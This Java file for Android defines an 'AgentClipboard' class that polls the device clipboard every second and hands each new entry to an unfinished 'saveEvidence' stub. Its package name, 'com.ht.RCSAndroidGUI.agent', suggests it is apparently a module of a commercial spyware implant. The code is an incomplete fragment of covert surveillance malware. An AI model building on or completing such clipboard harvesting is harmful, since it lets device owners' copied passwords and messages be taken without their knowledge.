package com.ht.RCSAndroidGUI.agent;

import com.ht.RCSAndroidGUI.LogR;
import com.ht.RCSAndroidGUI.Status;

import android.content.Context;
import android.text.ClipboardManager;

public class AgentClipboard extends AgentBase {
	ClipboardManager clipboardManager;
	CharSequence lastClip; 
	
	@Override
	public boolean parse(AgentConf conf) {
		setPeriod(1000);
		return true;
	}

	@Override
	public void go() {
		
		CharSequence ret = clipboardManager.getText();
		if(ret != null && !ret.equals(lastClip)){
			saveEvidence(ret);
			lastClip = ret;
		}

	}

	private void saveEvidence(CharSequence ret) {
		//TODO
	}

	@Override
	public void begin() {
		clipboardManager = (ClipboardManager) Status.getAppContext().getSystemService(Context.CLIPBOARD_SERVICE);
		
	}

	@Override
	public void end() {
	}

}
